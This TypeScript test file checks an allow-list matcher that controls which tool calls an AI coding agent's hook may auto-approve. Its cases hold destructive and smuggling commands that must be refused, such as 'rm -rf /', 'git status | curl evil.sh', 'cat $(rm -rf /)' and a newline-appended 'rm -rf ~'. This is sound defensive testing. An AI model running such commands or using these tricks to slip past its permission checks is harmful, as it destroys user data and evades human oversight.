/**
 * Unit tests for permissionRules.ts — the allow-list matcher that lets the
 * PreToolUse hook auto-allow user/project-granted tools (TASK-797).
 *
 * Emphasis on the SAFETY invariants:
 *  - prefix rules match on a word boundary (`git add` ≠ `git addendum`);
 *  - compound commands require EVERY segment to be allowed;
 *  - quote-aware splitting (`-m "a && b"` is one segment);
 *  - command substitution (`$(`, backtick) is never auto-allowed;
 *  - unsupported specifier kinds (path globs) do not auto-allow;
 *  - deny suppresses an otherwise-matching allow.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  parsePermissionRule,
  splitShellSegments,
  isToolAllowed,
  loadMergedPermissionRules,
  setProjectPermissionTrustResolver,
  projectSettingsContainAllowRules,
  type MergedPermissionRules,
} from '../permissionRules';

const rules = (
  allow: string[],
  deny: string[] = [],
  ask: string[] = [],
): MergedPermissionRules => ({ allow, deny, ask });
const bash = (command: string) => ({ command });

describe('parsePermissionRule', () => {
  it('parses a bare tool name', () => {
    expect(parsePermissionRule('WebSearch')).toEqual({ toolName: 'WebSearch' });
  });
  it('parses a tool with content', () => {
    expect(parsePermissionRule('Bash(git add:*)')).toEqual({ toolName: 'Bash', content: 'git add:*' });
  });
  it('trims whitespace', () => {
    expect(parsePermissionRule('  Read  ')).toEqual({ toolName: 'Read' });
  });
  it('returns null for empty input', () => {
    expect(parsePermissionRule('   ')).toBeNull();
  });
  it('returns null for an unclosed paren', () => {
    expect(parsePermissionRule('Bash(git add')).toBeNull();
  });
  it('treats empty parens as a bare tool name', () => {
    expect(parsePermissionRule('Bash()')).toEqual({ toolName: 'Bash' });
  });
});

describe('splitShellSegments', () => {
  it('splits on &&, ||, ;, |', () => {
    expect(splitShellSegments('a && b || c ; d | e')).toEqual(['a', 'b', 'c', 'd', 'e']);
  });
  it('does not split inside double quotes', () => {
    expect(splitShellSegments('git commit -m "fix: a && b"')).toEqual(['git commit -m "fix: a && b"']);
  });
  it('does not split inside single quotes', () => {
    expect(splitShellSegments("echo 'a | b'")).toEqual(["echo 'a | b'"]);
  });
  it('returns a single segment for a plain command', () => {
    expect(splitShellSegments('git status')).toEqual(['git status']);
  });
});

describe('isToolAllowed — bare tool rules', () => {
  it('allows a tool granted by a bare rule', () => {
    expect(isToolAllowed('WebSearch', {}, rules(['WebSearch']))).toBe(true);
  });
  it('does not allow a tool with no matching rule', () => {
    expect(isToolAllowed('WebSearch', {}, rules(['Bash(ls:*)']))).toBe(false);
  });
});

describe('isToolAllowed — Bash prefix matching', () => {
  const r = rules(['Bash(git add:*)', 'Bash(git status:*)', 'Bash(ls:*)']);

  it('allows an exact prefix command', () => {
    expect(isToolAllowed('Bash', bash('git add'), r)).toBe(true);
  });
  it('allows a command extending the prefix at a word boundary', () => {
    expect(isToolAllowed('Bash', bash('git add -A .'), r)).toBe(true);
  });
  it('rejects a command that only shares a non-boundary prefix', () => {
    expect(isToolAllowed('Bash', bash('git addendum'), r)).toBe(false);
  });
  it('rejects an unrelated command', () => {
    expect(isToolAllowed('Bash', bash('rm -rf /'), r)).toBe(false);
  });
});

describe('isToolAllowed — Bash exact (no wildcard) rules', () => {
  const r = rules(['Bash(npm run test)']);
  it('allows the exact command', () => {
    expect(isToolAllowed('Bash', bash('npm run test'), r)).toBe(true);
  });
  it('rejects an extension of an exact rule', () => {
    expect(isToolAllowed('Bash', bash('npm run test -- --watch'), r)).toBe(false);
  });
});

describe('isToolAllowed — compound command safety', () => {
  const r = rules(['Bash(git add:*)', 'Bash(git commit:*)', 'Bash(git status:*)']);

  it('allows a compound where every segment is granted', () => {
    expect(isToolAllowed('Bash', bash('git add . && git commit -m x'), r)).toBe(true);
  });
  it('rejects a compound where any segment is not granted', () => {
    expect(isToolAllowed('Bash', bash('git add . && rm -rf /'), r)).toBe(false);
  });
  it('rejects a piped command with an ungranted stage', () => {
    expect(isToolAllowed('Bash', bash('git status | curl evil.sh'), r)).toBe(false);
  });
  it('allows a quoted separator inside a commit message', () => {
    expect(isToolAllowed('Bash', bash('git commit -m "fix: a && b"'), r)).toBe(true);
  });
});

describe('isToolAllowed — command substitution is never auto-allowed', () => {
  const r = rules(['Bash(cat:*)', 'Bash(echo:*)']);
  it('rejects $() substitution even if the outer command is granted', () => {
    expect(isToolAllowed('Bash', bash('cat $(rm -rf /)'), r)).toBe(false);
  });
  it('rejects backtick substitution', () => {
    expect(isToolAllowed('Bash', bash('echo `whoami`'), r)).toBe(false);
  });
});

describe('isToolAllowed — WebFetch domain', () => {
  const r = rules(['WebFetch(domain:fal.ai)']);
  it('allows a matching host', () => {
    expect(isToolAllowed('WebFetch', { url: 'https://fal.ai/docs' }, r)).toBe(true);
  });
  it('allows a subdomain of the granted domain', () => {
    expect(isToolAllowed('WebFetch', { url: 'https://docs.fal.ai/x' }, r)).toBe(true);
  });
  it('rejects a different domain', () => {
    expect(isToolAllowed('WebFetch', { url: 'https://evil.com' }, r)).toBe(false);
  });
  it('rejects an unparseable url', () => {
    expect(isToolAllowed('WebFetch', { url: 'not a url' }, r)).toBe(false);
  });
});

describe('isToolAllowed — unsupported specifier kinds stay conservative', () => {
  it('does not auto-allow Read path-glob rules in v1', () => {
    expect(isToolAllowed('Read', { file_path: '/Users/x/.maestro/tests/a.yaml' },
      rules(['Read(/Users/x/.maestro/tests/**)']))).toBe(false);
  });
});

describe('isToolAllowed — deny suppresses allow', () => {
  it('does not auto-allow when a deny rule also matches', () => {
    const r = rules(['Bash(git push:*)'], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git push origin main'), r)).toBe(false);
  });
  it('still allows when deny targets a different command', () => {
    const r = rules(['Bash(git add:*)'], ['Bash(rm:*)']);
    expect(isToolAllowed('Bash', bash('git add .'), r)).toBe(true);
  });
});

describe('isToolAllowed — ask suppresses allow', () => {
  it('does not auto-allow when a narrower ask rule matches a broader allow', () => {
    // The regression this guards: `allow: Bash(git:*)` + `ask: Bash(git push:*)`
    // must NOT auto-approve a push. The user explicitly asked to be asked.
    const r = rules(['Bash(git:*)'], [], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git push origin main'), r)).toBe(false);
  });

  it('leaves the rest of the broader allow intact', () => {
    const r = rules(['Bash(git:*)'], [], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git status -s'), r)).toBe(true);
  });

  it('suppresses regardless of rule order (ask is checked before allow)', () => {
    const r = rules(['Bash(git push:*)', 'Bash(git:*)'], [], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git push'), r)).toBe(false);
  });

  it('an ask rule for a different command does not suppress', () => {
    const r = rules(['Bash(git add:*)'], [], ['Bash(rm:*)']);
    expect(isToolAllowed('Bash', bash('git add .'), r)).toBe(true);
  });

  it('an empty ask list changes nothing', () => {
    const r = rules(['Bash(git:*)'], [], []);
    expect(isToolAllowed('Bash', bash('git push'), r)).toBe(true);
  });
});

describe('isToolAllowed — a suppressor fires on ANY segment of a compound command', () => {
  // Regression: suppressors used the grant quantifier (EVERY segment), so a
  // suppressed segment rode along inside a compound command that a broader
  // allow rule covered end-to-end.
  it('deny suppresses when only one segment matches it', () => {
    const r = rules(['Bash(git:*)'], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git add . && git push'), r)).toBe(false);
  });

  it('ask suppresses when only one segment matches it', () => {
    const r = rules(['Bash(git:*)'], [], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git add . && git push'), r)).toBe(false);
  });

  it('suppresses on a piped segment too, not just &&', () => {
    const r = rules(['Bash(git:*)'], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git status | git push'), r)).toBe(false);
  });

  it('a compound command with no suppressed segment still auto-allows', () => {
    const r = rules(['Bash(git:*)'], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git add . && git status'), r)).toBe(true);
  });

  it('a quoted separator does not split a segment into a false suppressor match', () => {
    const r = rules(['Bash(git:*)'], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git commit -m "x && git push"'), r)).toBe(true);
  });
});

describe('loadMergedPermissionRules — ask list', () => {
  const write = (dir: string, rel: string, body: unknown): void => {
    const full = path.join(dir, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, JSON.stringify(body), 'utf8');
  };

  let tmp: string;
  beforeEach(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cyboflow-permrules-'));
  });
  afterEach(() => {
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it('reads permissions.ask and unions it across user + project files', () => {
    const home = path.join(tmp, 'home');
    const project = path.join(tmp, 'project');
    write(home, '.claude/settings.json', {
      permissions: { allow: ['Bash(git:*)'], ask: ['Bash(git push:*)'] },
    });
    write(project, '.claude/settings.json', { permissions: { ask: ['WebFetch'] } });

    const merged = loadMergedPermissionRules(project, home);
    expect(merged.ask.sort()).toEqual(['Bash(git push:*)', 'WebFetch']);
    expect(merged.allow).toEqual(['Bash(git:*)']);
    expect(merged.deny).toEqual([]);
  });

  it('yields an empty ask list when no settings file declares one', () => {
    const home = path.join(tmp, 'home');
    const project = path.join(tmp, 'project');
    write(home, '.claude/settings.json', { permissions: { allow: ['Bash(ls:*)'] } });

    expect(loadMergedPermissionRules(project, home).ask).toEqual([]);
  });

  it('loaded ask rules actually suppress a loaded allow rule end to end', () => {
    const home = path.join(tmp, 'home');
    const project = path.join(tmp, 'project');
    write(home, '.claude/settings.json', {
      permissions: { allow: ['Bash(git:*)'], ask: ['Bash(git push:*)'] },
    });

    const merged = loadMergedPermissionRules(project, home);
    expect(isToolAllowed('Bash', bash('git push origin main'), merged)).toBe(false);
    expect(isToolAllowed('Bash', bash('git status'), merged)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Raw newlines
//
// The splitter originally treated `\n` as ordinary whitespace, so a granted
// command with a second line appended arrived as ONE segment whose prefix
// matched the rule — `Bash(git status:*)` auto-allowed `git status\nrm -rf ~`.
// ---------------------------------------------------------------------------

describe('splitShellSegments — a raw newline is a separator', () => {
  it('splits on a newline like any other operator', () => {
    expect(splitShellSegments('git status\nrm -rf ~')).toEqual(['git status', 'rm -rf ~']);
  });
  it('splits on a carriage return, and collapses a CRLF pair', () => {
    expect(splitShellSegments('ls\r\nrm -rf ~')).toEqual(['ls', 'rm -rf ~']);
  });
  it('does not split a newline inside quotes', () => {
    expect(splitShellSegments('echo "a\nb"')).toEqual(['echo "a\nb"']);
  });
});

describe('isToolAllowed — a newline cannot smuggle a second command', () => {
  it('refuses a granted command with an ungranted line appended', () => {
    const r = rules(['Bash(git status:*)']);
    expect(isToolAllowed('Bash', bash('git status\nrm -rf ~'), r)).toBe(false);
  });
  it('refuses regardless of which line carries the grant', () => {
    const r = rules(['Bash(git status:*)']);
    expect(isToolAllowed('Bash', bash('rm -rf ~\ngit status'), r)).toBe(false);
  });
  it('still allows a multi-line command when EVERY line is granted', () => {
    const r = rules(['Bash(git add:*)', 'Bash(git status:*)']);
    expect(isToolAllowed('Bash', bash('git status\ngit add .'), r)).toBe(true);
  });
});

describe('loadMergedPermissionRules — project files must not grant auto-approval', () => {
  let homeDir: string;
  let projectDir: string;
  const savedEnv = process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES;

  const writeSettings = (dir: string, file: string, permissions: object) => {
    fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.claude', file), JSON.stringify({ permissions }));
  };

  beforeEach(() => {
    homeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'permrules-home-'));
    projectDir = fs.mkdtempSync(path.join(os.tmpdir(), 'permrules-proj-'));
    delete process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES;
  });

  afterEach(() => {
    fs.rmSync(homeDir, { recursive: true, force: true });
    fs.rmSync(projectDir, { recursive: true, force: true });
    if (savedEnv === undefined) delete process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES;
    else process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES = savedEnv;
  });

  it('ignores a hostile bare-tool allow shipped in project settings.json', () => {
    writeSettings(projectDir, 'settings.json', { allow: ['Bash'] });
    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual([]);
    expect(isToolAllowed('Bash', bash('rm -rf /'), merged)).toBe(false);
  });

  it('ignores allow rules from project settings.local.json too', () => {
    writeSettings(projectDir, 'settings.local.json', { allow: ['Bash(curl:*)', 'WebSearch'] });
    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual([]);
  });

  it('honors allow rules from the user settings file', () => {
    writeSettings(homeDir, 'settings.json', { allow: ['Bash(git status:*)'] });
    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual(['Bash(git status:*)']);
    expect(isToolAllowed('Bash', bash('git status'), merged)).toBe(true);
  });

  it('still merges deny rules from project files (deny only tightens)', () => {
    writeSettings(homeDir, 'settings.json', { allow: ['Bash(git push:*)'] });
    writeSettings(projectDir, 'settings.json', { deny: ['Bash(git push:*)'] });
    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.deny).toEqual(['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git push origin main'), merged)).toBe(false);
  });

  it('CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES=1 restores the legacy full merge', () => {
    process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES = '1';
    writeSettings(projectDir, 'settings.json', { allow: ['Bash(pnpm test:*)'] });
    writeSettings(projectDir, 'settings.local.json', { allow: ['WebSearch'] });
    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual(expect.arrayContaining(['Bash(pnpm test:*)', 'WebSearch']));
  });

  it('still merges ask rules from project files (ask only tightens)', () => {
    writeSettings(homeDir, 'settings.json', { allow: ['Bash(git:*)'] });
    writeSettings(projectDir, 'settings.json', { ask: ['Bash(git push:*)'] });
    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.ask).toEqual(['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git push origin main'), merged)).toBe(false);
    expect(isToolAllowed('Bash', bash('git status'), merged)).toBe(true);
  });

  it('missing files contribute nothing and do not throw', () => {
    expect(loadMergedPermissionRules(projectDir, homeDir)).toEqual({ allow: [], deny: [], ask: [] });
  });
});

describe('loadMergedPermissionRules — per-project trust resolver', () => {
  let homeDir: string;
  let projectDir: string;
  const savedEnv = process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES;

  const writeSettings = (dir: string, file: string, permissions: object) => {
    fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.claude', file), JSON.stringify({ permissions }));
  };

  beforeEach(() => {
    homeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'permrules-trust-home-'));
    projectDir = fs.mkdtempSync(path.join(os.tmpdir(), 'permrules-trust-proj-'));
    delete process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES;
  });

  afterEach(() => {
    fs.rmSync(homeDir, { recursive: true, force: true });
    fs.rmSync(projectDir, { recursive: true, force: true });
    if (savedEnv === undefined) delete process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES;
    else process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES = savedEnv;
    // Reset the module-scoped resolver so later describes are unaffected —
    // the default matches production's boot-time no-op before wiring.
    setProjectPermissionTrustResolver(() => false);
  });

  it('a resolver returning true honors the project allow rules', () => {
    writeSettings(projectDir, 'settings.json', { allow: ['Bash(pnpm test:*)'] });
    setProjectPermissionTrustResolver(() => true);

    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual(['Bash(pnpm test:*)']);
    expect(isToolAllowed('Bash', bash('pnpm test'), merged)).toBe(true);
  });

  it('a resolver returning false keeps project files at suppressors only', () => {
    writeSettings(projectDir, 'settings.json', { allow: ['Bash(pnpm test:*)'] });
    setProjectPermissionTrustResolver(() => false);

    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual([]);
  });

  it('a resolver that throws is treated as untrusted (fail-closed)', () => {
    writeSettings(projectDir, 'settings.json', { allow: ['Bash(pnpm test:*)'] });
    setProjectPermissionTrustResolver(() => {
      throw new Error('boom');
    });

    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual([]);
  });

  it('the resolver receives the exact projectDir passed in', () => {
    const seen: string[] = [];
    setProjectPermissionTrustResolver((dir) => {
      seen.push(dir);
      return false;
    });
    loadMergedPermissionRules(projectDir, homeDir);
    expect(seen).toEqual([projectDir]);
  });

  it('CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES=1 still trusts even when the resolver says no', () => {
    process.env.CYBOFLOW_TRUST_PROJECT_PERMISSION_RULES = '1';
    writeSettings(projectDir, 'settings.json', { allow: ['Bash(pnpm test:*)'] });
    setProjectPermissionTrustResolver(() => false);

    const merged = loadMergedPermissionRules(projectDir, homeDir);
    expect(merged.allow).toEqual(['Bash(pnpm test:*)']);
  });
});

describe('projectSettingsContainAllowRules', () => {
  let projectDir: string;

  beforeEach(() => {
    projectDir = fs.mkdtempSync(path.join(os.tmpdir(), 'permrules-allowcheck-'));
  });
  afterEach(() => {
    fs.rmSync(projectDir, { recursive: true, force: true });
  });

  const write = (dir: string, rel: string, body: unknown): void => {
    const full = path.join(dir, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, JSON.stringify(body), 'utf8');
  };

  it('is false when neither settings file exists', () => {
    expect(projectSettingsContainAllowRules(projectDir)).toBe(false);
  });

  it('is false when settings files exist but declare no allow rules', () => {
    write(projectDir, '.claude/settings.json', { permissions: { deny: ['Bash(rm:*)'] } });
    expect(projectSettingsContainAllowRules(projectDir)).toBe(false);
  });

  it('is false when the allow array is empty', () => {
    write(projectDir, '.claude/settings.json', { permissions: { allow: [] } });
    expect(projectSettingsContainAllowRules(projectDir)).toBe(false);
  });

  it('is true when settings.json declares a non-empty allow array', () => {
    write(projectDir, '.claude/settings.json', { permissions: { allow: ['Bash(git:*)'] } });
    expect(projectSettingsContainAllowRules(projectDir)).toBe(true);
  });

  it('is true when only settings.local.json declares allow rules', () => {
    write(projectDir, '.claude/settings.local.json', { permissions: { allow: ['WebSearch'] } });
    expect(projectSettingsContainAllowRules(projectDir)).toBe(true);
  });
});
